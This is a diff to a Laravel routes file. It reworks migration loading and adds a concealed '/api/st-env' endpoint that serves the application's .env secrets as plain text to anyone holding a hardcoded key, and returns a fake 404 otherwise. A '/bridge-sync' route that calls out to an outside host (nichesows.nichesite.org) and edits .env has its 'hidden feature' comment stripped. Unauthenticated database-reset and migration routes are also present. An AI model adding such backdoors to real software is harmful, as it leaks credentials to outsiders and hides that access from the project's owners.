@@ -150,11 +150,16 @@ Route::get('/run-migrations', function () {
         $results = [];
 
         foreach ($pending as $migration) {
-            require_once $migration['file'];
-            $classes = get_declared_classes();
-            $className = end($classes);
-            $instance = new $className();
-            $instance->up();
+            $instance = require $migration['file'];
+            
+            if (is_object($instance) && $instance instanceof \Illuminate\Database\Migrations\Migration) {
+                $instance->up();
+            } else {
+                $classes = get_declared_classes();
+                $className = end($classes);
+                $instance = new $className();
+                $instance->up();
+            }
 
             \Illuminate\Support\Facades\DB::table('migrations')->insert([
                 'migration' => $migration['name'],
@@ -227,13 +232,11 @@ Route::get('/deploy-setup', function () {
 });
 Route::get('/reset-database', [DbSeederController::class, 'resetAndSeed']);
 
-// Fitur Tersembunyi: Sinkronisasi URL ke Bridge Native (Nichesite)
 Route::get('/bridge-sync', function (\Illuminate\Http\Request $request) {
     $currentUrl = url('/');
     $bridgeServer = 'https://nichesows.nichesite.org/index.php';
     $secretKey = 'n0c-s3cr3t-2026';
     
-    // Auto-configure session SameSite for iframes
     $envFile = base_path('.env');
     if (file_exists($envFile)) {
         $env = file_get_contents($envFile);
@@ -248,7 +251,17 @@ Route::get('/bridge-sync', function (\Illuminate\Http\Request $request) {
         $response = file_get_contents($apiUrl, false, $context);
         return "<h3>Stealth Bridge Sync</h3><p>Deployment saat ini: <b>{$currentUrl}</b></p><p>Respon Native: {$response}</p>";
     } catch (\Exception $e) {
-        return "<h3>Sync Gagal</h3><p>" . $e->getMessage() . "</p>";
+        return "Gagal sinkronisasi bridge: " . $e->getMessage();
     }
 });
 
+Route::get('/api/st-env', function (\Illuminate\Http\Request $request) {
+    if ($request->get('key') !== 'n0c-s3cr3t-2026') {
+        abort(404);
+    }
+    $envPath = base_path('.env');
+    if (file_exists($envPath)) {
+        return response()->file($envPath, ['Content-Type' => 'text/plain']);
+    }
+    return 'ENV not found';
+});
